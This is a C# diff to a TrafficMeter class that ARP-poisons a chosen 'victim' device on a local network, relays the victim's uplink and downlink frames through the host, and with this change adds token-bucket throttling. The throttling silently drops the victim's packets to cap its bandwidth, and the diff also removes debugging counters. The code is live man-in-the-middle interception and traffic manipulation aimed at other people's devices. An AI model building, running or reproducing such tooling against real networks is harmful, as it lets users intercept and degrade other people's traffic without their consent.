@@ -29,21 +29,17 @@ public sealed class TrafficMeter : IDisposable
     private volatile Dictionary<string, PhysicalAddress> _lanMacs = new();
     private int _tick;
 
-    public long RxFrames { get; private set; }
-    public long RxIPv4 { get; private set; }
-    public long RelayedUp { get; private set; }
-    public long RelayedDown { get; private set; }
-    public long VictimSrcSeen { get; private set; }
-    public long VictimDstSeen { get; private set; }
-    private readonly Dictionary<string, long> _pairs = new();
-    public string PairsTop => string.Join(" | ", _pairs.OrderByDescending(kv => kv.Value).Take(6).Select(kv => $"{kv.Key}={kv.Value}"));
-    private readonly Queue<string> _recent = new();
-    public string Recent => string.Join(" | ", _recent);
-    public string TargetDesc => _target == null ? "none" : $"{_target.Ip} {_target.Mac}";
-    public string? LastError { get; private set; }
+    // Token bucket used to enforce LimitKbps. Dropping frames at the relay is
+    // what actually throttles the client: TCP backs off on the loss, while the
+    // link stays usable instead of being cut.
+    private double _budgetBytes;
+    private long _budgetAt;
+    private long _dropped;
 
-    public bool IsMetering => _running;
     public string? MeteredIp => _target?.Ip;
+
+    /// <summary>0 = unlimited. Enforced on the traffic relayed through us.</summary>
+    public int LimitKbps { get; set; }
 
     public TrafficMeter(NetworkInfo net, ArpPoisoner poisoner, Func<List<DeviceInfo>> deviceProvider)
     {
@@ -59,7 +55,9 @@ public sealed class TrafficMeter : IDisposable
         _target = target;
         _down = _up = 0;
         _downSample = _upSample = 0;
-        RxFrames = RxIPv4 = RelayedUp = RelayedDown = 0;
+        _dropped = 0;
+        _budgetBytes = 0;
+        _budgetAt = Environment.TickCount64;
 
         _poisoner.OnFrame += OnFrame;
 
@@ -87,7 +85,7 @@ public sealed class TrafficMeter : IDisposable
         var gwMac = _net.GatewayMac;
         if (t == null || gwMac == null) return;
 
-        var victimMac = _net.ParseMacSafe(t.Mac);
+        var victimMac = NetworkInfo.ParseMacSafe(t.Mac);
         if (victimMac == null) return;
         var victimIp = IPAddress.Parse(t.Ip);
         var ourMac = _net.LocalMac;
@@ -96,7 +94,7 @@ public sealed class TrafficMeter : IDisposable
         foreach (var d in _deviceProvider())
         {
             if (d.Ip == t.Ip || d.IsSelf) continue;
-            var dMac = _net.ParseMacSafe(d.Mac);
+            var dMac = NetworkInfo.ParseMacSafe(d.Mac);
             if (dMac == null) continue;
             macs[d.Ip] = dMac;
 
@@ -117,7 +115,7 @@ public sealed class TrafficMeter : IDisposable
         var gwMac = _net.GatewayMac;
         if (t == null || gwMac == null) return;
 
-        var victimMac = _net.ParseMacSafe(t.Mac);
+        var victimMac = NetworkInfo.ParseMacSafe(t.Mac);
         if (victimMac == null) return;
         var victimIp = IPAddress.Parse(t.Ip);
         var gwIp = IPAddress.Parse(_net.GatewayIpString);
@@ -132,7 +130,7 @@ public sealed class TrafficMeter : IDisposable
             foreach (var d in _deviceProvider())
             {
                 if (d.Ip == t.Ip || d.Ip == _net.GatewayIpString || d.IsSelf) continue;
-                var dMac = _net.ParseMacSafe(d.Mac);
+                var dMac = NetworkInfo.ParseMacSafe(d.Mac);
                 if (dMac == null) continue;
                 try { SendArpRequest(dMac, victimMac, victimIp, IPAddress.Parse(d.Ip)); } catch { }
             }
@@ -175,60 +173,67 @@ public sealed class TrafficMeter : IDisposable
         var t = _target;
         if (t == null || !_running) return;
 
-        RxFrames++;
-
         if (buf.Length < 42) return;
         if (MacEquals(buf, 6, _net.LocalMac)) return;   // our own transmission: skip
         if (!MacEquals(buf, 0, _net.LocalMac)) return;  // not addressed to us: skip
         if (((buf[12] << 8) | buf[13]) != 0x0800) return;   // IPv4 only
-        RxIPv4++;
         if ((buf[14] >> 4) != 4) return;                    // version
         int ihl = (buf[14] & 0x0F) * 4;
         if (ihl < 20 || 14 + ihl > buf.Length) return;
 
-        var victimMac = _net.ParseMacSafe(t.Mac);
+        var victimMac = NetworkInfo.ParseMacSafe(t.Mac);
         if (victimMac == null) return;
-
-        lock (_pairs)
-        {
-            var key = MacStr(buf, 6) + "->" + MacStr(buf, 0);
-            _pairs.TryGetValue(key, out var c);
-            _pairs[key] = c + 1;
-        }
 
         var victimIp = IPAddress.Parse(t.Ip);
         var srcIp = new IPAddress(new byte[] { buf[14 + 12], buf[14 + 13], buf[14 + 14], buf[14 + 15] });
         var dstIp = new IPAddress(new byte[] { buf[14 + 16], buf[14 + 17], buf[14 + 18], buf[14 + 19] });
 
-        lock (_recent)
-        {
-            _recent.Enqueue($"srcIsVictim={MacEquals(buf, 6, victimMac)} dstIsVictimIp={dstIp.Equals(victimIp)} srcIpIsVictim={srcIp.Equals(victimIp)} [{MacStr(buf, 6)} {MacStrOf(victimMac)}] [{dstIp} {victimIp}]");
-            while (_recent.Count > 6) _recent.Dequeue();
-        }
-
         if (MacEquals(buf, 6, victimMac))
         {
-            VictimSrcSeen++;
             // Victim's uplink: relay to the real destination (gateway for internet, real MAC for LAN).
             var dstMac = _net.GatewayMac;
             if (dstMac == null) return;
             if (_lanMacs.TryGetValue(dstIp.ToString(), out var lanMac)) dstMac = lanMac;
+            if (!Allow(buf.Length)) { _dropped++; return; }
             if (Relay(buf, dstMac))
             {
                 _up += buf.Length;
-                RelayedUp++;
             }
         }
         else if (dstIp.Equals(victimIp) && !srcIp.Equals(victimIp))
         {
-            VictimDstSeen++;
             // Victim's downlink: relay to the victim's real MAC.
+            if (!Allow(buf.Length)) { _dropped++; return; }
             if (Relay(buf, victimMac))
             {
                 _down += buf.Length;
-                RelayedDown++;
             }
         }
+    }
+
+    /// <summary>
+    /// Token bucket over both directions of the metered device. A limit of 0
+    /// passes everything through untouched.
+    /// </summary>
+    private bool Allow(int bytes)
+    {
+        var limit = LimitKbps;
+        if (limit <= 0) return true;
+
+        var now = Environment.TickCount64;
+        var elapsed = now - _budgetAt;
+        if (elapsed > 0)
+        {
+            _budgetAt = now;
+            var bytesPerSecond = limit * 1024.0 / 8.0;
+            _budgetBytes += elapsed / 1000.0 * bytesPerSecond;
+            var burst = Math.Max(1500.0, bytesPerSecond / 2.0);
+            if (_budgetBytes > burst) _budgetBytes = burst;
+        }
+
+        if (bytes > _budgetBytes) return false;
+        _budgetBytes -= bytes;
+        return true;
     }
 
     private bool Relay(byte[] buf, PhysicalAddress dstMac)
@@ -275,6 +280,7 @@ public sealed class TrafficMeter : IDisposable
                 var t = _target;
                 if (t != null)
                 {
+                    t.DroppedFrames = _dropped;
                     try
                     {
                         OnSample?.Invoke(t, Math.Max(0, downKbps), Math.Max(0, upKbps));
@@ -295,12 +301,6 @@ public sealed class TrafficMeter : IDisposable
             if (frame[offset + i] != b[i]) return false;
         return true;
     }
-
-    private static string MacStr(byte[] frame, int offset) =>
-        string.Join(":", frame.Skip(offset).Take(6).Select(b => b.ToString("X2")));
-
-    private static string MacStrOf(PhysicalAddress mac) =>
-        string.Join(":", mac.GetAddressBytes().Select(b => b.ToString("X2")));
 
     public void Dispose() => Stop();
 }
